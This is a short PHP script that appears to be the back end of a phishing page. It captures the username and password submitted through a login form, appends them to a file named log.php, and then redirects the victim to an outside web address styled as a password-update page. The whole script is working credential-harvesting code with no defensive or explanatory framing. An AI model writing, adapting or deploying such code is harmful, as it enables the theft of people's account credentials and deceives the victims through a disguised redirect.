<?php 
$handle = fopen("log.php", "a");
fwrite($handle,"email: ");
fwrite($handle,$_POST["username"]);  
fwrite($handle,"\n");
fwrite($handle,"password: ");
fwrite($handle,$_POST["password"]);  
fwrite($handle,"\n");
header("Location: http://zirnbra.com/settings/password/update/403"); 
exit; 
?> 
